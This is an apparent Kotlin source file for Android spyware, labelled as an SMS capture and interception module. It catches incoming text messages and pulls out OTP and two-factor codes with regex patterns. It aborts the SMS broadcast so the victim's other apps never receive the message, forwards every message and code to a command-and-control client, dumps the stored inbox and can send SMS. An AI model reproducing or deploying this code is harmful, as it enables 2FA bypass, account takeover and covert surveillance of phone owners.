package com.xrc.app.surveillance

import android.Manifest
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.provider.Telephony
import android.telephony.SmsMessage
import android.util.Log
import com.xrc.app.XRCApp
import org.json.JSONArray
import org.json.JSONObject

/**
 * SMS capture and interception module.
 * Intercepts incoming SMS, reads existing messages, and can send SMS.
 */
class SMSReceiver : BroadcastReceiver() {

    companion object {
        const val TAG = "SMSReceiver"
        private val interceptedOtps = mutableMapOf<String, String>()
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return

        try {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            for (msg in messages) {
                processIncomingSMS(msg)
            }

            // Abort broadcast to prevent SMS from reaching other apps
            // This is only possible if we have the highest priority
            abortBroadcast()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to process SMS: ${e.message}")
        }
    }

    private fun processIncomingSMS(msg: SmsMessage) {
        val sender = msg.originatingAddress ?: "unknown"
        val body = msg.messageBody ?: ""
        val timestamp = msg.timestampMillis

        // Extract OTP codes
        val otpCode = extractOTP(body)
        if (otpCode != null) {
            interceptedOtps[sender] = otpCode
            Log.i(TAG, "Intercepted OTP from $sender: $otpCode")
        }

        val json = JSONObject().apply {
            put("type", "sms_intercepted")
            put("sender", sender)
            put("body", body.take(1000))
            put("time", timestamp)
            put("otp", otpCode ?: "")
        }

        XRCApp.instance.c2Client.send(json.toString())
    }

    private fun extractOTP(body: String): String? {
        val patterns = listOf(
            Regex("""(?:OTP|CODE|PIN|VERIFICATION|AUTH|LOGIN|2FA|TWO FACTOR)[^0-9]*?(\d{4,8})""", RegexOption.IGNORE_CASE),
            Regex("""(\d{4,8})\s+is your""", RegexOption.IGNORE_CASE),
            Regex("""is\s*:?\s*(\d{4,8})\s*(?:\n|\.|$)"""),
            Regex("""(\d{6})\s""")
        )

        for (pattern in patterns) {
            val match = pattern.find(body)
            if (match != null) {
                val code = match.groupValues[1]
                // Verify it looks like an OTP
                if (code.length >= 4 && code.length <= 8) {
                    return code
                }
            }
        }
        return null
    }

    fun getInterceptedOtps(): Map<String, String> = interceptedOtps.toMap()
}

object SMSCapture {

    fun readSMS(context: Context, limit: Int = 50): JSONArray {
        val messages = JSONArray()
        try {
            val uri = Telephony.Sms.CONTENT_URI
            val cursor = context.contentResolver.query(
                uri, null, null, null,
                "${Telephony.Sms.DATE} DESC LIMIT $limit"
            )

            cursor?.use {
                val addressIdx = it.getColumnIndex(Telephony.Sms.ADDRESS)
                val bodyIdx = it.getColumnIndex(Telephony.Sms.BODY)
                val dateIdx = it.getColumnIndex(Telephony.Sms.DATE)
                val typeIdx = it.getColumnIndex(Telephony.Sms.TYPE)

                while (it.moveToNext()) {
                    val msg = JSONObject().apply {
                        put("address", if (addressIdx >= 0) it.getString(addressIdx) else "")
                        put("body", if (bodyIdx >= 0) it.getString(bodyIdx)?.take(500) else "")
                        put("date", if (dateIdx >= 0) it.getLong(dateIdx) else 0L)
                        put("type", if (typeIdx >= 0) it.getInt(typeIdx) else 0)
                    }
                    messages.put(msg)
                }
            }
        } catch (e: Exception) {
            Log.e("SMSCapture", "Error reading SMS: ${e.message}")
        }
        return messages
    }

    fun sendSMS(context: Context, number: String, message: String): Boolean {
        return try {
            val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                context.getSystemService(android.telephony.TelephonyManager::class.java)
                    ?.createForSubscriptionId(Telephony.Sms.getDefaultSmsSubscriptionId(context))
            } else {
                null
            }
            // Use SmsManager directly
            val sms = android.telephony.SmsManager.getDefault()
            sms.sendTextMessage(number, null, message, null, null)
            Log.i("SMSCapture", "SMS sent to $number")
            true
        } catch (e: Exception) {
            Log.e("SMSCapture", "Failed to send SMS: ${e.message}")
            false
        }
    }
}
